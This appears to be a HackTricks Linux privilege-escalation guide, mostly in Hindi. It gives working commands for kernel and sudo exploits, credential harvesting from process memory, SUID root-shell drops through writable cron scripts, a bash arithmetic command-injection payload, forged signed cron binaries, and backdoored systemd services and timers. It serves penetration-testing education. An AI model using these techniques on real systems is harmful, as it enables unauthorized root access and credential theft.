# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी इकट्ठा करें।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **have write permissions on any folder inside the `PATH`** variable, तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel संस्करण की जांच करें और देखें कि क्या कोई exploit है जिसे escalate privileges के लिए उपयोग किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel सूची और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel संस्करण निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले टूल्स:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **search the kernel version in Google**, हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो सकेंगे कि यह exploit वैध है।

अतिरिक्त kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

निम्नलिखित कमजोर sudo संस्करणों के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo का संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के वे संस्करण जो 1.9.17p1 से पहले हैं (**1.9.14 - 1.9.17 < 1.9.17p1**), अनाधिकार प्राप्त स्थानीय उपयोगकर्ताओं को sudo `--chroot` विकल्प के माध्यम से उनके privileges को root तक escalate करने की अनुमति देते हैं, जब `/etc/nsswitch.conf` फ़ाइल किसी user controlled डायरेक्टरी से उपयोग की जाती है।

यहाँ उस [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) का लिंक है जो उस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) का exploit करने के लिए है। Exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` संस्करण vulnerable है और यह `chroot` feature को support करता है।

अधिक जानकारी के लिए, मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन असफल

देखें **smasher2 box of HTB** में इस vuln को किस प्रकार exploited किया जा सकता है, इसका **उदाहरण**।
```bash
dmesg 2>/dev/null | grep "signature"
```
### और system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित बचावों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

अगर आप docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जांचें **what is mounted and unmounted**, कहाँ और क्यों। अगर कुछ भी unmounted है तो आप इसे mount करने की कोशिश कर सकते हैं और निजी जानकारी की जांच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही जाँचें कि **कोई compiler इंस्टॉल है**। यह तब उपयोगी होता है जब आपको कोई kernel exploit इस्तेमाल करना हो, क्योंकि अनुशंसा की जाती है कि इसे उसी मशीन पर compile करें जहाँ आप इसे उपयोग करने वाले हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### स्थापित कमजोर सॉफ़्टवेयर

**इंस्टॉल किए गए पैकेज और सेवाओं के संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) मौजूद हो जिसे escalating privileges के लिए exploited किया जा सके…\
संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअल रूप से जाँचने की सिफारिश की जाती है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH एक्सेस है, तो आप मशीन में इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएँगे जो अधिकांशतः बेकार होगी, इसलिए OpenVAS या इसी तरह के कुछ ऐप्लिकेशन की सलाह दी जाती है जो जांचें कि क्या किसी इंस्टॉल किए गए सॉफ़्टवेयर वर्ज़न पर किसी ज्ञात exploits के लिए कमजोरियाँ मौजूद हैं_

## प्रक्रियाएँ

देखें कि **कौन-कौन से प्रोसेस** निष्पादित हो रहे हैं और जाँचें कि किसी प्रक्रिया के पास **उचित से अधिक अधिकार** तो नहीं हैं (शायद tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** उन्‍हें प्रक्रिया की कमांड लाइन में `--inspect` पैरामीटर देखकर पता लगाता है।\
साथ ही **processes के binaries पर अपनी privileges चेक करें**, शायद आप किसी को overwrite कर सकें।

### प्रोसेस मॉनिटरिंग

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग प्रक्रियाओं की निगरानी के लिए कर सकते हैं। यह अक्सर यह पहचानने में बहुत उपयोगी होता है कि कौन सी कमजोर प्रक्रियाएँ बार-बार चलायी जा रही हैं या जब कुछ आवश्यकताएँ पूरी होती हैं।

### प्रोसेस मेमोरी

कुछ सर्विसेज़ सर्वर की मेमोरी के अंदर **credentials को clear text में सेव** कर देती हैं।\
आम तौर पर आपको अन्य users के processes की मेमोरी पढ़ने के लिये **root privileges** चाहिए होते हैं, इसलिए यह आमतौर पर तब ज़्यादा उपयोगी होता है जब आप पहले से ही root हों और और अधिक credentials खोजना चाहें।\
हालाँकि, ध्यान रखें कि **एक सामान्य user के रूप में आप उन प्रक्रियाओं की मेमोरी पढ़ सकते हैं जिनके मालिक आप हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकतर मशीनें डिफ़ॉल्ट रूप से **ptrace की अनुमति नहीं देतीं**, जिसका अर्थ है कि आप अपने unprivileged user के अंतर्गत आने वाली अन्य प्रक्रियाओं को dump नहीं कर पाएंगे।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते कि उनका uid समान हो। यह ptracing का पारंपरिक तरीका था।
> - **kernel.yama.ptrace_scope = 1**: केवल एक parent process को ही debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ही ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक है।
> - **kernel.yama.ptrace_scope = 3**: कोई भी प्रक्रिया ptrace से trace नहीं की जा सकती। एक बार सेट होने पर, ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service की मेमोरी (उदाहरण के लिए) तक access है तो आप Heap निकालकर उसके अंदर के credentials की खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

दिए गए process ID के लिए, **maps दिखाते हैं कि मेमोरी उस प्रोसेस के वर्चुअल एड्रेस स्पेस में कैसे मैप की गई है**; यह **प्रत्येक मैप किए गए क्षेत्र की अनुमतियाँ** भी दिखाता है। **mem** छद्म फ़ाइल **प्रोसेस की मेमोरी को स्वयं उजागर करती है**। **maps** फ़ाइल से हम जान लेते हैं कि कौन से **मेमोरी क्षेत्र पढ़ने योग्य हैं** और उनके ऑफ़सेट्स क्या हैं। हम इस जानकारी का उपयोग **mem फ़ाइल में seek करने और सभी पढ़ने योग्य क्षेत्रों को एक फ़ाइल में dump करने** के लिए करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी। कर्नेल का वर्चुअल पता स्थान /dev/kmem का उपयोग करके एक्सेस किया जा सकता है.\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump Windows के लिए Sysinternals suite के क्लासिक ProcDump टूल की Linux के लिए पुनर्कल्पना है। इसे प्राप्त करें [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

Process memory को dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root आवश्यकताएँ हटाकर अपने द्वारा चलाए गए प्रोसेस को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root अनिवार्य है)

### प्रोसेस मेमोरी से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पिछले अनुभाग देखें ताकि किसी process की memory dump करने के विभिन्न तरीके मिल सकें) और memory के अंदर credentials की खोज कर सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **स्पष्ट-पाठ क्रेडेंशियल्स** और कुछ **प्रसिद्ध फाइलों** से इन्हें चुराता है। इसे सही तरीके से काम करने के लिए रूट विशेषाधिकारों की आवश्यकता होती है।

| विशेषता                                           | प्रोसेस नाम           |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                      | vsftpd               |
| Apache2 (सक्रिय HTTP Basic Auth सत्र)             | apache2              |
| OpenSSH (सक्रिय SSH सत्र - sudo उपयोग)            | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

### Crontab UI (alseambusher) root के रूप में चल रहा है – web-based scheduler privesc

यदि एक web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback के साथ bound है, तो आप इसे SSH local port-forwarding के माध्यम से फिर भी पहुँचा सकते हैं और एक privileged job बनाकर escalate कर सकते हैं।

सामान्य चेन
- केवल loopback पर उपलब्ध पोर्ट खोजें (उदा., 127.0.0.1:8000) और Basic-Auth realm को `ss -ntlp` / `curl -v localhost:8000` के माध्यम से पहचानें
- ऑपरेशनल artifacts में क्रेडेंशियल्स खोजें:
  - Backups/scripts जिनमें `zip -P <password>`
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` को एक्सपोज़ कर रही हो
- टनेल करके लॉगिन करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित उपयोगकर्ता और न्यूनतम अनुमतियों के साथ सीमित करें
- localhost पर bind करें और अतिरिक्त रूप से firewall/VPN के माध्यम से एक्सेस सीमित करें; पासवर्ड का पुन: उपयोग न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँच करें कि कोई scheduled job vulnerable तो नहीं है। हो सकता है आप उस script का फायदा उठा सकें जिसे root द्वारा executed किया जा रहा है (wildcard vuln? क्या आप उन फाइलों को modify कर सकते हैं जिन्हें root उपयोग करता है? symlinks का उपयोग करें? root द्वारा उपयोग की जाने वाली directory में specific फाइलें बनाएं?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab के अंदर root उपयोगकर्ता बिना PATH सेट किए किसी कमांड या स्क्रिप्ट को निष्पादित करने की कोशिश करे. उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब, आप root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron: script में wildcard का उपयोग (Wildcard Injection)

यदि कोई script root द्वारा चलाया जाता है और किसी command के अंदर “**\***” होता है, तो आप इसे अनपेक्षित चीज़ों (जैसे privesc) के लिए exploit कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी पथ जैसे** _**/some/path/***_ **से पहले आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है। यदि कोई root cron/parser untrusted log fields पढ़कर उन्हें किसी arithmetic context में भेजता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron के चलने पर root के रूप में execute होता है।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion। इसलिए एक मान जैसे `$(/bin/bash -c 'id > /tmp/pwn')0` पहले substitute हो जाता है (command चलता है), फिर शेष numeric `0` arithmetic के लिए उपयोग होता है ताकि स्क्रिप्ट बिना errors के जारी रहे।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: attacker-controlled टेक्स्ट को parsed log में लिखवाइए ताकि numeric-looking फ़ील्ड में command substitution हो और वह किसी digit पर खत्म हो। सुनिश्चित करें कि आपका command stdout पर कुछ न छापे (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **root द्वारा चलाए जाने वाले किसी cron script को modify कर सकते हैं**, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा चलाया गया script किसी ऐसी **directory where you have full access** का उपयोग करता है, तो संभवतः उस folder को हटाना और **create a symlink folder to another one** बनाकर उस पर आपके नियंत्रित script को सर्व करना उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams कभी-कभी "sign" cron-driven बाइनरीज़ करती हैं — एक custom ELF सेक्शन dump करके और vendor string के लिए grep करके उन्हें root के रूप में execute करने से पहले। अगर वह बाइनरी group-writable है (उदा., `/opt/AV/periodic-checks/monitor` जिसका मालिक `root:devs 770` है) और आप signing material को leak कर पाते हैं, तो आप उस सेक्शन को forge करके cron task hijack कर सकते हैं:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. अपेक्षित certificate को leaked key/config (from `signing.zip`) का उपयोग करके पुनः बनाएं:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (उदा., drop a SUID bash, add your SSH key) और certificate को `.text_sig` में embed करें ताकि grep पास हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Scheduled binary को overwrite करें, execute bits बनाए रखकर:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगली cron run का इंतज़ार करें; जैसे ही naive signature check सफल होता है, आपका payload root के रूप में चलेगा।

### बार-बार होने वाले cron jobs

आप processes को monitor कर सकते हैं उन processes को खोजने के लिए जो हर 1, 2 या 5 मिनट में execute हो रही हों। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली प्रत्येक प्रक्रिया की निगरानी करेगा और सूची बनाएगा).

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जा सकता है **टिप्पणी के बाद carriage return डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं, तो आप इसे **संसोधित कर सकते हैं** ताकि यह **निष्पादित करे** आपका **backdoor जब** सेवा **शुरू** होने, **पुनःआरंभ** होने या **रुकी** होने पर (हो सकता है कि आपको मशीन के reboot होने तक प्रतीक्षा करनी पड़े)।\
उदाहरण के लिए अपनी backdoor को `.service` फ़ाइल के अंदर बनाएं जिसमें **`ExecStart=/tmp/script.sh`** हो।

### लिखने योग्य सर्विस बाइनरी

ध्यान रखें कि यदि आपके पास **write permissions over binaries being executed by services** हैं, तो आप उन्हें backdoors में बदल सकते हैं ताकि जब services को फिर से चलाया जाए तो backdoors निष्पादित हो जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को यह चलाकर देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप path के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप संभवतः **escalate privileges** कर पाएंगे। आपको उन फ़ाइलों में **relative paths being used on service configurations** की खोज करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिसमें आप लिख सकते हैं, relative path binary के समान नाम का एक **executable** बनाएं, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, तो आपका **backdoor** executed होगा (unprivileged users सामान्यतः services को start/stop नहीं कर सकते लेकिन देखें कि क्या आप `sudo -l` का उपयोग कर सकते हैं).

**services के बारे में और जानने के लिए `man systemd.service` पढ़ें।**

## **Timers**

**Timers** वे systemd unit files हैं जिनका नाम `**.timer**` पर समाप्त होता है और जो `**.service**` files या events को control करते हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronously चलाया जा सकता है।

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### लिखने योग्य timers

यदि आप किसी timer को संशोधित कर सकते हैं, तो आप इसे systemd.unit के कुछ मौजूद यूनिट (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> यह Unit है जिसे यह timer समाप्त होने पर सक्रिय करने के लिए उपयोग किया जाता है। आर्ग्युमेंट एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर डिफ़ॉल्ट होगा जिसका नाम timer unit के समान होता है, सिवाय suffix के। (ऊपर देखें.) अनुशंसित है कि जो unit सक्रिय किया जाता है और timer unit का नाम सिवाय suffix के समान हों।

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को ढूंढें जो **executing a writable binary** हो
- ऐसा systemd unit ढूंढें जो **executing a relative path** हो और आपके पास उस **systemd PATH** पर **writable privileges** हों (ताकि आप उस executable का impersonate कर सकें)

**Learn more about timers with `man systemd.timer`.**

### **Timer सक्षम करना**

किसी timer को सक्षम करने के लिए आपको root privileges की आवश्यकता होती है और निम्न चलाना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल में एक ही या अलग मशीनों पर **process communication** सक्षम करते हैं। वे कंप्यूटर-बीच संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फाइलों के माध्यम से सेटअप होते हैं।

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**`man systemd.socket` से sockets के बारे में और जानें।** इस फ़ाइल के अंदर कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन सारांश का उपयोग यह **बताने** के लिए होता है कि यह कहाँ सुनने वाला है (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने वाला port नंबर, आदि)
- `Accept`: boolean argument लेता है। अगर **true** है, तो हर आने वाले connection के लिए एक **service instance spawned** किया जाता है और केवल connection socket ही उसे पास किया जाता है। अगर **false** है, तो सभी listening sockets खुद ही **started service unit को पास** किए जाते हैं, और सभी connections के लिए केवल एक service unit spawned होता है। Datagram sockets और FIFOs के लिए यह value अनदेखा कर दी जाती है जहाँ एक ही service unit बिना शर्त सभी incoming traffic को handle करता है। **डिफ़ॉल्ट false है**। प्रदर्शन के कारण, नए daemons को केवल इस तरह लिखा जाना चाहिए कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेती हैं, जिन्हें listening **sockets**/FIFOs के **बने** जाने और bind होने से क्रमश: **पहले** या **बाद** execute किया जाता है। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जिन्हें listening **sockets**/FIFOs के **closed** और हटाए जाने से क्रमश: **पहले** या **बाद** execute किया जाता है।
